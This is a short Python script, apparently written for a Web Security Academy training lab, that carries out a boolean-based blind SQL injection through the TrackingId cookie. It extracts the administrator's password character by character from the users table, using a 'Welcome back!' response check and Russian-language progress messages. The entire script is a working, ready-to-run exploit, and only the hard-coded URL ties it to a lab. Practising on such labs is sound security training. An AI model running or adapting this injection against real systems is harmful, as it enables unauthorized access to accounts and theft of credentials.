import requests
import string

URL = "https://0a5800e60412e09a81a1cf2000050088.web-security-academy.net/"

def check_condition(payload_condition):
    payload = f"x' OR ({payload_condition})--"
    cookies = {'TrackingId': payload}
    
    response = requests.get(URL, cookies=cookies)
    
    return "Welcome back!" in response.text

def main():
    print("[*] Начинаем извлечение пароля администратора (Boolean-based)...")
    password = ""
    
    for position in range(1, 31):
        found_char = False
        
        for char in string.ascii_lowercase + string.digits:
            condition = f"SUBSTRING((SELECT password FROM users WHERE username='administrator'), {position}, 1) = '{char}'"
            
            if check_condition(condition):
                password += char
                print(f"[+] Позиция {position}: {char} (Текущий пароль: {password})")
                found_char = True
                break
        
        if not found_char:
            print(f"[!] Символ на позиции {position} не найден. Конец пароля.")
            break
            
    print(f"\n[+] Итоговый пароль: {password}")

if __name__ == "__main__":
    main()